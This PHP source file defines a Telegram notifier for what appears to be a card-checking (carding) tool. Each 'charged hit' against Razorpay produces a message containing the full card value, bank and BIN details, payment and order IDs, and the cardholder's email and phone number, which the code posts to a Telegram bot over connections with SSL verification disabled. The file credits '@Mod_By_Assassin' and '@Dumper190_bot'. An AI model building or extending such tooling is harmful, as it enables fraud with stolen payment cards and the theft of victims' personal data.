<?php

declare(strict_types=1);

/**
 * TelegramNotifier - Sends detailed hit drops and test alerts to Telegram.
 * Completely fail-safe: methods never throw exceptions or disrupt caller.
 */
final class TelegramNotifier
{
    /**
     * Send a full-details charged hit drop to Telegram.
     * Guaranteed fail-safe: never throws exceptions.
     */
    public static function sendHitNotification(
        string $botToken,
        string $chatId,
        array $result,
        array $tokens = []
    ): bool {
        try {
            if ($botToken === '' || $chatId === '') {
                return false;
            }

            $card       = (string) ($result['card'] ?? 'N/A');
            $status     = strtoupper((string) ($result['status'] ?? 'CHARGED'));
            $message    = (string) ($result['message'] ?? 'Payment Successfully');
            $site       = (string) ($result['site'] ?? 'N/A');
            $timeTaken  = (string) ($result['time_taken'] ?? 'N/A');

            $paymentId  = (string) ($tokens['payment_id'] ?? ($tokens['razorpay_payment_id'] ?? ''));
            $orderId    = (string) ($tokens['order_id'] ?? ($tokens['razorpay_order_id'] ?? ''));
            $network    = trim((string) ($tokens['card_network'] ?? ''));
            $cardType   = trim((string) ($tokens['card_type'] ?? ''));
            $country    = trim((string) ($tokens['card_country'] ?? ''));
            $currency   = trim((string) ($tokens['bin_currency'] ?? ($tokens['currency'] ?? 'INR')));
            $issuer     = trim((string) ($tokens['issuer_name'] ?? ''));
            $email      = trim((string) ($tokens['email'] ?? ''));
            $contact    = trim((string) ($tokens['contact'] ?? ''));

            $brand = trim("{$network} {$cardType}");
            if ($brand === '') {
                $brand = 'N/A';
            }

            $text  = "🔥 <b>RAZORPAY CHARGED HIT</b> 🔥\n";
            $text .= "━━━━━━━━━━━━━━━━━━━━\n";
            $text .= "💳 <b>Card:</b> <code>" . self::escapeHtml($card) . "</code>\n";
            $text .= "💰 <b>Amount:</b> ₹100.00 (10000 Paise)\n";
            $text .= "📊 <b>Status:</b> <b>" . self::escapeHtml($status) . " ✅</b>\n";
            $text .= "💬 <b>Response:</b> " . self::escapeHtml($message) . "\n";
            $text .= "━━━━━━━━━━━━━━━━━━━━\n";
            $text .= "<b>CARD / BIN INFO</b>\n";
            if ($issuer !== '') {
                $text .= "🏦 <b>Bank:</b> " . self::escapeHtml(strtoupper($issuer)) . "\n";
            }
            if ($network !== '') {
                $text .= "🏷 <b>Network:</b> " . self::escapeHtml(strtoupper($network)) . "\n";
            }
            if ($cardType !== '') {
                $text .= "📋 <b>Type:</b> " . self::escapeHtml(strtoupper($cardType)) . "\n";
            }
            if ($country !== '') {
                $text .= "🌍 <b>Country:</b> " . self::escapeHtml(strtoupper($country)) . ($currency !== '' ? " (" . self::escapeHtml(strtoupper($currency)) . ")" : "") . "\n";
            }
            $text .= "━━━━━━━━━━━━━━━━━━━━\n";
            $text .= "<b>PAYMENT DETAILS</b>\n";
            if ($paymentId !== '') {
                $text .= "🆔 <b>Payment ID:</b> <code>" . self::escapeHtml($paymentId) . "</code>\n";
            }
            if ($orderId !== '') {
                $text .= "📦 <b>Order ID:</b> <code>" . self::escapeHtml($orderId) . "</code>\n";
            }
            if ($email !== '') {
                $text .= "📧 <b>Email:</b> <code>" . self::escapeHtml($email) . "</code>\n";
            }
            if ($contact !== '') {
                $text .= "📱 <b>Phone:</b> <code>" . self::escapeHtml($contact) . "</code>\n";
            }
            $text .= "🔗 <b>Site:</b> " . self::escapeHtml($site) . "\n";
            $text .= "⏱ <b>Time Taken:</b> " . self::escapeHtml($timeTaken) . "\n";
            $text .= "📅 <b>Date:</b> " . gmdate('Y-m-d H:i:s') . " UTC\n";
            $text .= "━━━━━━━━━━━━━━━━━━━━\n";
            $text .= "🤖 <b>Checked By:</b> @Dumper190_bot\n";
            $text .= "👨‍💻 <b>Dev:</b> @Mod_By_Assassin";

            return self::sendMessage($botToken, $chatId, $text);
        } catch (Throwable) {
            return false;
        }
    }

    /**
     * Send a test message to verify Telegram setup.
     *
     * @return array{ok: bool, error?: string}
     */
    public static function sendTestMessage(string $botToken, string $chatId): array
    {
        try {
            if ($botToken === '') {
                return ['ok' => false, 'error' => 'Telegram Bot Token is empty.'];
            }
            if ($chatId === '') {
                return ['ok' => false, 'error' => 'Telegram Chat ID is empty.'];
            }

            $text  = "🔔 <b>Telegram Notification Test</b>\n\n";
            $text .= "✅ Your Razorpay Hit Notification is configured correctly!\n";
            $text .= "📅 <b>Time:</b> " . gmdate('Y-m-d H:i:s') . " UTC\n";
            $text .= "👨‍💻 <b>Dev:</b> @Mod_By_Assassin";

            return self::sendMessageDetailed($botToken, $chatId, $text);
        } catch (Throwable $e) {
            return ['ok' => false, 'error' => $e->getMessage()];
        }
    }

    /**
     * Send an HTML formatted message to Telegram.
     */
    public static function sendMessage(string $botToken, string $chatId, string $htmlText): bool
    {
        try {
            $res = self::sendMessageDetailed($botToken, $chatId, $htmlText);
            return $res['ok'] ?? false;
        } catch (Throwable) {
            return false;
        }
    }

    /**
     * Send message with detailed response (with automatic -100 supergroup retry).
     *
     * @return array{ok: bool, error?: string}
     */
    public static function sendMessageDetailed(string $botToken, string $chatId, string $htmlText): array
    {
        try {
            $res = self::dispatchMessage($botToken, $chatId, $htmlText);

            // If regular group ID failed with 'chat not found', try supergroup -100 prefix
            if (!$res['ok'] && str_starts_with($chatId, '-') && !str_starts_with($chatId, '-100')) {
                $altChatId = '-100' . ltrim($chatId, '-');
                $altRes = self::dispatchMessage($botToken, $altChatId, $htmlText);
                if ($altRes['ok']) {
                    return $altRes;
                }
            }

            return $res;
        } catch (Throwable $e) {
            return ['ok' => false, 'error' => $e->getMessage()];
        }
    }

    /**
     * Low-level Telegram sendMessage dispatch.
     *
     * @return array{ok: bool, error?: string}
     */
    private static function dispatchMessage(string $botToken, string $chatId, string $htmlText): array
    {
        $url = 'https://api.telegram.org/bot' . rawurlencode($botToken) . '/sendMessage';
        $postData = [
            'chat_id'                  => $chatId,
            'text'                     => $htmlText,
            'parse_mode'               => 'HTML',
            'disable_web_page_preview' => true,
        ];

        try {
            if (function_exists('curl_init')) {
                $ch = curl_init($url);
                if ($ch === false) {
                    return ['ok' => false, 'error' => 'curl_init failed'];
                }

                curl_setopt_array($ch, [
                    CURLOPT_POST           => true,
                    CURLOPT_POSTFIELDS     => http_build_query($postData),
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_TIMEOUT        => 4,
                    CURLOPT_CONNECTTIMEOUT => 2,
                    CURLOPT_NOSIGNAL       => 1,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => 0,
                ]);

                $response = @curl_exec($ch);
                $err      = curl_error($ch);
                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                curl_close($ch);

                if ($response === false || $httpCode !== 200) {
                    $json = is_string($response) ? json_decode($response, true) : null;
                    $desc = $json['description'] ?? ($err ?: "HTTP {$httpCode}");
                    return ['ok' => false, 'error' => (string) $desc];
                }

                return ['ok' => true];
            }

            // Fallback via file_get_contents
            $opts = [
                'http' => [
                    'method'  => 'POST',
                    'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
                    'content' => http_build_query($postData),
                    'timeout' => 4,
                ],
                'ssl' => [
                    'verify_peer'      => false,
                    'verify_peer_name' => false,
                ],
            ];
            $context = stream_context_create($opts);
            $res = @file_get_contents($url, false, $context);
            if ($res === false) {
                return ['ok' => false, 'error' => 'file_get_contents failed to reach Telegram API.'];
            }
            return ['ok' => true];
        } catch (Throwable $e) {
            return ['ok' => false, 'error' => $e->getMessage()];
        }
    }

    private static function escapeHtml(string $text): string
    {
        return htmlspecialchars($text, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    }
}
